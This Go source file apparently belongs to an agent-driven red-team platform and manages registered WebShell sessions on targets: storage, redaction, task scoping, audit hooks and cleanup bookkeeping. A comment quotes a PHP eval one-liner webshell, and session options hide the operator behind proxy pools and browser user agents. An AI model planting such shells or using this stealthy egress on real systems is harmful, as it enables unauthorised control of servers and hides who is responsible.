// Package webshell implements managed WebShell sessions for red team operations:
// register a landed shell, drive it (command / file transfer), probe whether it
// still answers, and retire it with a controlled cleanup.
//
// 设计边界（刻意不做）：
//   - 不落 OS 层持久化（cron/systemd/计划任务/注册表）。「目标重启后仍能回来」
//     是另一个维度的事，且平台当前立场是「权限维持只做演示可行，不实际部署
//     长期后门」（skills/redteam-ops）。本包管的是 Web 层的通道：马来路已经
//     存在或由 agent 显式投递，平台负责把它登记下来、能复用、能查活、能清干净。
//   - 不做免杀/变形生成。内置模板只是「最小可用、能验证链路」的载荷，落地上
//     目标的马由测评人自备（PUT_PAYLOAD_DIR 覆盖），平台不承担对抗 WAF 的职责。
//   - 不内置口令爆破。param 是参数名不是口令——一个马能不能用，取决于它是否
//     已经落地并可执行，不取决于平台猜得准不准。
//
// 三条纪律（与 pivot / stage 一致）：
//  1. 会话库只存「怎么连」，列表投影永不含 param 名与 header 值；执行时才从库里取。
//  2. 删会话默认只摘登记，remove_remote=true 才动远端；远端没清干净会报错并保留
//     登记，确认要丢弃必须显式 force。
//  3. 每条会话属于一个 task（TaskID）。跨任务不可见、不可执行——WebShell 就是
//     目标上的控制权，不能变成平台级共享资源。
package webshell

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
	"sync"
	"time"
)

const (
	// StoreName 是会话库文件名（0600，落在数据目录下）。
	StoreName = "webshells.json"
	// MaxSessions 是会话库上限。每个会话至少是一个目标上的执行入口，几百条
	// 已经远超一次测评的真实规模；不限量会让全量落盘变成慢操作。
	MaxSessions = 500
	// DefaultTimeout 是单次载荷请求的默认超时。
	DefaultTimeout = 30 * time.Second
	// MaxExecOutput 是单次执行回传给模型的上限（超出截断，避免撑爆上下文）。
	MaxExecOutput = 100 * 1024
)

// 类型语义（与 artex-full 的 webshell 保持一致，方便两边会话库互认）：
//
//	php     —— eval 型一句话马（<?php @eval($_POST['p']);?>）。先按 PHP 代码
//	           投递，失败自动回退到「命令 base64」模式（免杀马常见形态）。
//	php_raw —— eval 型，但只接受 PHP 代码，不回退（避免对只吃代码的马乱发命令）。
//	jsp     —— 命令型，payload 直接是命令行。
//	aspx    —— 命令型，payload 直接是命令行。
var ValidTypes = []string{"php", "php_raw", "jsp", "aspx"}

var (
	// 会话名允许中文，禁止控制字符与路径分隔符（它只是个键，但会进日志）。
	sessionNameRE = regexp.MustCompile(`^[^\x00-\x1f\x7f/\\]{1,64}$`)
	urlRE         = regexp.MustCompile(`(?i)^https?://[^\s]+$`)
	// param 是请求参数名：PHP 变量风格，允许 a-b 与 a[b] 这种常见写法。
	paramRE = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_\-\[\]]{0,63}$`)
)

var (
	// ErrNotFound 用于把「会话不存在」映射成 404，而不是 500。
	ErrNotFound = errors.New("webshell 会话不存在")
	// ErrInvalid 表示入参不合法（400）。
	ErrInvalid = errors.New("webshell 会话参数不合法")
)

// Session 是一个已登记的 WebShell。Param 是请求参数名（不是口令）；它不进
// 列表投影，执行时才从库里读。
type Session struct {
	URL      string            `json:"url"`
	Type     string            `json:"type"`
	Param    string            `json:"param"`
	Method   string            `json:"method,omitempty"`
	Header   map[string]string `json:"header,omitempty"`
	Note     string            `json:"note,omitempty"`
	TaskID   int64             `json:"task_id,omitempty"`
	RemotePath string          `json:"remote_path,omitempty"`
	// Artifacts 是经上传接口写到远端的文件，受管清理时一并处理。
	Artifacts []string `json:"artifacts,omitempty"`
	// Proxy 是这条会话的出口：socks5h://user:pass@host:port 或 http://...，
	// 也接受逗号分隔的池。空则看环境变量 POJUN_WEBSHELL_PROXY，再空才直连。
	// 目的：目标侧只看到代理/节点 IP，看不到平台地址。
	Proxy string `json:"proxy,omitempty"`
	// UserAgent 覆盖默认 UA；默认用普通浏览器 UA（不自报工具名）。
	UserAgent string `json:"user_agent,omitempty"`
	// ProxyRotate 为真时每次请求换出口。默认否：同一会话固定出口 IP 更不显眼。
	ProxyRotate bool `json:"proxy_rotate,omitempty"`
	CreatedAt   time.Time `json:"created_at"`
	UpdatedAt   time.Time `json:"updated_at,omitempty"`

	// 运行期字段：进程内缓存载荷模式（eval/raw），不落盘。
	mode string
}

// View 是列表/详情的返回投影：绝不含 Param、Header 的值、代理账密。
type View struct {
	Name       string   `json:"name"`
	URL        string   `json:"url"` // query 里的参数值已打码
	Type       string   `json:"type"`
	Method     string   `json:"method"`
	Note       string   `json:"note,omitempty"`
	TaskID     int64    `json:"task_id,omitempty"`
	RemotePath string   `json:"remote_path,omitempty"`
	Artifacts  []string `json:"artifacts,omitempty"`
	Proxy      string   `json:"proxy,omitempty"` // 账密已换成 ***
	Egress     string   `json:"egress,omitempty"` // 实际出口：代理地址或「直连」
	UserAgent  string   `json:"user_agent,omitempty"`
	ProxyRotate bool    `json:"proxy_rotate,omitempty"`
	ParamSet   bool     `json:"param_set"`
	HasHeader  bool     `json:"has_header"`
	HeaderKeys []string `json:"header_keys,omitempty"`
	CreatedAt  string   `json:"created_at"`
	UpdatedAt  string   `json:"updated_at,omitempty"`
}

// AddOptions 是登记一条会话的输入。
type AddOptions struct {
	Name       string
	URL        string
	Type       string
	Param      string
	Method     string
	Header     map[string]string
	Note       string
	TaskID     int64
	RemotePath string
	Proxy      string
	UserAgent  string
	ProxyRotate bool
	// Overwrite 为真时同名会话被替换（默认报错，避免静默覆盖别人登记的入口）。
	Overwrite bool
}

// Manager 管理全部会话（进程级单例，由 server 持有）。磁盘是唯一真相源，
// 内存里只缓存一份；每次写都全量落盘（会话数量有上限，且远小于文件写入的
// 成本阈值）。
type Manager struct {
	mu       sync.Mutex
	dir      string
	sessions map[string]*Session

	// OnEvent 是审计钩子（登记 / 摘登记 / 清理）。由 server 注入，写进归属任务
	// 的 activity。刻意不含 exec：执行频率高，逐条记会把真正的关键动作淹掉。
	// 调用发生在锁外——回调里再调 List/Get 不会死锁。
	OnEvent func(Event)
}

// Event 是一次会话状态变更。
type Event struct {
	// Kind: register / unregister / purge
	Kind    string
	Name    string
	TaskID  int64
	URL     string
	Type    string
	Remote  bool // 是否动过远端（仅 purge 有意义）
	Detail  string
}

// emit 安全触发审计钩子。
func (m *Manager) emit(ev Event) {
	if m == nil || m.OnEvent == nil {
		return
	}
	m.OnEvent(ev)
}

// storeFile 是磁盘格式：name -> session。
type storeFile struct {
	Version int                 `json:"version"`
	Items   map[string]*Session `json:"items"`
}

// NewManager 建 manager。dir 为空则用系统临时目录（仅测试；生产由 server 传
// 数据目录）。目录不存在会被创建。
func NewManager(dir string) (*Manager, error) {
	if strings.TrimSpace(dir) == "" {
		dir = filepath.Join(os.TempDir(), "pojun-webshell")
	}
	if err := os.MkdirAll(dir, 0o700); err != nil {
		return nil, fmt.Errorf("创建 webshell 数据目录失败: %w", err)
	}
	m := &Manager{dir: dir, sessions: map[string]*Session{}}
	if err := m.load(); err != nil {
		return nil, err
	}
	return m, nil
}

// Dir 返回数据目录（server 用来展示「会话库在哪」）。
func (m *Manager) Dir() string { return m.dir }

func (m *Manager) storePath() string { return filepath.Join(m.dir, StoreName) }

// load 读盘。文件不存在视为空库（首次启动）；解析失败报错而不是静默清空——
// 静默清空会让所有已登记的入口一次性消失，且没有任何痕迹说明为什么。
func (m *Manager) load() error {
	path := m.storePath()
	raw, err := os.ReadFile(path)
	if err != nil {
		if os.IsNotExist(err) {
			return nil
		}
		return fmt.Errorf("读取 %s 失败: %w", path, err)
	}
	if len(strings.TrimSpace(string(raw))) == 0 {
		return nil
	}
	var f storeFile
	if err := json.Unmarshal(raw, &f); err != nil {
		return fmt.Errorf("解析 %s 失败（文件损坏，请人工检查而不是删除）: %w", path, err)
	}
	for name, s := range f.Items {
		if s == nil {
			continue
		}
		m.sessions[name] = s
	}
	return nil
}

// saveLocked 全量落盘（调用方持锁）。原子写 + 0600：会话库里有目标地址和参数
// 名，泄漏出去等于把「哪台机器上有马」直接交出去。
func (m *Manager) saveLocked() error {
	items := make(map[string]*Session, len(m.sessions))
	for k, v := range m.sessions {
		items[k] = v
	}
	buf, err := json.MarshalIndent(storeFile{Version: 1, Items: items}, "", "  ")
	if err != nil {
		return fmt.Errorf("序列化会话库失败: %w", err)
	}
	path := m.storePath()
	tmp := path + ".tmp"
	if err := os.WriteFile(tmp, buf, 0o600); err != nil {
		return fmt.Errorf("写 %s 失败: %w", tmp, err)
	}
	if err := os.Rename(tmp, path); err != nil {
		// rename 失败时清掉临时文件，别在数据目录里留半截内容。
		_ = os.Remove(tmp)
		return fmt.Errorf("替换 %s 失败: %w", path, err)
	}
	return nil
}

// validate 校验一条会话的可执行性。宁可在登记时就拒绝，也不要等到 agent 在
// 目标上跑了十几次才发现参数名拼错。
func validate(name string, s *Session) error {
	if !sessionNameRE.MatchString(name) {
		return fmt.Errorf("%w：名称须为 1-64 字符，且不能含 / 与 \\", ErrInvalid)
	}
	if !urlRE.MatchString(strings.TrimSpace(s.URL)) {
		return fmt.Errorf("%w：url 必须是 http(s):// 开头的完整地址", ErrInvalid)
	}
	okType := false
	for _, t := range ValidTypes {
		if s.Type == t {
			okType = true
			break
		}
	}
	if !okType {
		return fmt.Errorf("%w：type 只支持 %s", ErrInvalid, strings.Join(ValidTypes, "/"))
	}
	if s.Param == "" {
		s.Param = "pass"
	}
	if !paramRE.MatchString(s.Param) {
		return fmt.Errorf("%w：param 必须是合法参数名（字母/下划线开头，允许 [ ] 与 -）", ErrInvalid)
	}
	s.Method = strings.ToUpper(strings.TrimSpace(s.Method))
	if s.Method == "" {
		s.Method = "POST"
	}
	if s.Method != "GET" && s.Method != "POST" {
		return fmt.Errorf("%w：method 只支持 GET / POST", ErrInvalid)
	}
	if strings.ContainsAny(strings.TrimSpace(s.Note), "\x00") {
		return fmt.Errorf("%w：note 含空字节", ErrInvalid)
	}
	return nil
}

// Add 登记（或覆盖）一条会话。
func (m *Manager) Add(opts AddOptions) (View, error) {
	name := strings.TrimSpace(opts.Name)
	if name == "" {
		// 没给名字就按目标主机 + 时间生成一个，省得 agent 为了起名多花一轮。
		name = autoName(opts.URL)
	}
	s := &Session{
		URL:         strings.TrimSpace(opts.URL),
		Type:        strings.TrimSpace(opts.Type),
		Param:       strings.TrimSpace(opts.Param),
		Method:      opts.Method,
		Header:      opts.Header,
		Note:        strings.TrimSpace(opts.Note),
		TaskID:      opts.TaskID,
		RemotePath:  strings.TrimSpace(opts.RemotePath),
		Proxy:       strings.TrimSpace(opts.Proxy),
		UserAgent:   strings.TrimSpace(opts.UserAgent),
		ProxyRotate: opts.ProxyRotate,
		CreatedAt:   time.Now().UTC(),
	}
	if err := validate(name, s); err != nil {
		return View{}, err
	}
	m.mu.Lock()
	if _, exists := m.sessions[name]; exists && !opts.Overwrite {
		m.mu.Unlock()
		return View{}, fmt.Errorf("%w：会话 %q 已存在（要替换请传 overwrite=true）", ErrInvalid, name)
	}
	if _, exists := m.sessions[name]; !exists && len(m.sessions) >= MaxSessions {
		m.mu.Unlock()
		return View{}, fmt.Errorf("%w：会话数已达上限 %d，先清理不用的", ErrInvalid, MaxSessions)
	}
	m.sessions[name] = s
	err := m.saveLocked()
	if err != nil {
		delete(m.sessions, name)
	}
	m.mu.Unlock()
	if err != nil {
		return View{}, err
	}
	m.emit(Event{Kind: "register", Name: name, TaskID: s.TaskID, URL: redactURL(s.URL), Type: s.Type})
	return s.view(name), nil
}

// autoName 从 URL 派生一个可读的名字。
func autoName(rawURL string) string {
	u := strings.TrimSpace(rawURL)
	u = strings.TrimPrefix(u, "http://")
	u = strings.TrimPrefix(u, "https://")
	if i := strings.IndexAny(u, "/?#"); i > 0 {
		u = u[:i]
	}
	if u == "" {
		u = "shell"
	}
	// 去掉端口里的冒号，名字里不欢迎路径分隔符（冒号本身允许，但读起来别扭）
	u = strings.ReplaceAll(u, ":", "_")
	if len(u) > 48 {
		u = u[:48]
	}
	return u + "-" + randHex(3)
}

func randHex(n int) string {
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		return fmt.Sprintf("%06x", time.Now().UnixNano()&0xffffff)
	}
	return hex.EncodeToString(b)
}

// Get 按名字取会话（含 Param，仅供执行路径使用，绝不直接返回给调用方渲染）。
func (m *Manager) Get(name string) (Session, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	s, ok := m.sessions[name]
	if !ok {
		return Session{}, fmt.Errorf("%w: %s", ErrNotFound, name)
	}
	return *s, nil
}

// Update 局部更新（只改非空字段）。Param 非空才覆盖——前端不展示旧值，
// 留空表示「保持原样」。
func (m *Manager) Update(name string, set func(*Session)) (View, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	s, ok := m.sessions[name]
	if !ok {
		return View{}, fmt.Errorf("%w: %s", ErrNotFound, name)
	}
	before := *s
	set(s)
	s.UpdatedAt = time.Now().UTC()
	if err := validate(name, s); err != nil {
		*s = before
		return View{}, err
	}
	if err := m.saveLocked(); err != nil {
		*s = before
		return View{}, err
	}
	return s.view(name), nil
}

// Remove 摘登记。调用方负责先完成远端清理；这里只管库。
func (m *Manager) Remove(name string) error {
	m.mu.Lock()
	s, ok := m.sessions[name]
	if !ok {
		m.mu.Unlock()
		return fmt.Errorf("%w: %s", ErrNotFound, name)
	}
	delete(m.sessions, name)
	err := m.saveLocked()
	m.mu.Unlock()
	if err != nil {
		return err
	}
	m.emit(Event{Kind: "unregister", Name: name, TaskID: s.TaskID, URL: redactURL(s.URL), Type: s.Type})
	return nil
}

// AddArtifact 记一条经上传写到远端的文件，供受管清理使用。
func (m *Manager) AddArtifact(name, remotePath string) {
	m.mu.Lock()
	defer m.mu.Unlock()
	s, ok := m.sessions[name]
	if !ok || remotePath == "" {
		return
	}
	for _, a := range s.Artifacts {
		if a == remotePath {
			return
		}
	}
	s.Artifacts = append(s.Artifacts, remotePath)
	s.UpdatedAt = time.Now().UTC()
	_ = m.saveLocked()
}

// List 列出会话。taskID 为 0 表示不过滤（仅管理端「全部」视图用）；agent 工具
// 永远传自己的 taskID，看不到别的任务的入口。
func (m *Manager) List(taskID int64) []View {
	m.mu.Lock()
	defer m.mu.Unlock()
	names := make([]string, 0, len(m.sessions))
	for name, s := range m.sessions {
		if taskID != 0 && s.TaskID != taskID {
			continue
		}
		names = append(names, name)
	}
	sort.Strings(names)
	out := make([]View, 0, len(names))
	for _, name := range names {
		out = append(out, m.sessions[name].view(name))
	}
	return out
}

// Count 返回会话总数（概览用）。
func (m *Manager) Count() int {
	m.mu.Lock()
	defer m.mu.Unlock()
	return len(m.sessions)
}

// view 生成脱敏投影。
func (s *Session) view(name string) View {
	v := View{
		Name:        name,
		URL:         redactURL(s.URL),
		Type:        s.Type,
		Method:      s.Method,
		Note:        s.Note,
		TaskID:      s.TaskID,
		RemotePath:  s.RemotePath,
		Artifacts:   append([]string(nil), s.Artifacts...),
		Proxy:       redactProxy(s.Proxy),
		Egress:      egressLabel(s),
		UserAgent:   s.UserAgent,
		ProxyRotate: s.ProxyRotate,
		ParamSet:    strings.TrimSpace(s.Param) != "",
		HasHeader:   len(s.Header) > 0,
		CreatedAt:   s.CreatedAt.Format(time.RFC3339),
	}
	if !s.UpdatedAt.IsZero() {
		v.UpdatedAt = s.UpdatedAt.Format(time.RFC3339)
	}
	if len(s.Header) > 0 {
		keys := make([]string, 0, len(s.Header))
		for k := range s.Header {
			keys = append(keys, k)
		}
		sort.Strings(keys)
		v.HeaderKeys = keys
	}
	return v
}

// redactURL 把 query 里的参数值换成 ***：URL 会出现在页面、日志和工具返回值
// 里，而 query 里往往就带着参数名（等于马的钥匙）。
func redactURL(raw string) string {
	i := strings.Index(raw, "?")
	if i < 0 {
		return raw
	}
	base, q := raw[:i], raw[i+1:]
	parts := strings.Split(q, "&")
	for j, p := range parts {
		if k := strings.Index(p, "="); k > 0 {
			parts[j] = p[:k] + "=***"
		}
	}
	return base + "?" + strings.Join(parts, "&")
}

// redactProxy 把代理 URL 里的账密换成 ***。
func redactProxy(raw string) string {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return ""
	}
	at := strings.LastIndex(raw, "@")
	if at < 0 {
		return raw
	}
	schemeEnd := strings.Index(raw, "://")
	if schemeEnd < 0 {
		return "***@" + raw[at+1:]
	}
	return raw[:schemeEnd+3] + "***@" + raw[at+1:]
}

// egressLabel 告诉人「这条会话从哪出去的」。直连是个需要被看见的事实。
func egressLabel(s *Session) string {
	p := strings.TrimSpace(s.Proxy)
	if p == "" {
		p = strings.TrimSpace(os.Getenv(ProxyEnv))
	}
	if p == "" {
		return "直连"
	}
	if s.ProxyRotate || strings.ContainsAny(p, ",;") {
		return "代理池 " + redactProxy(p) + "（轮换）"
	}
	return redactProxy(p)
}
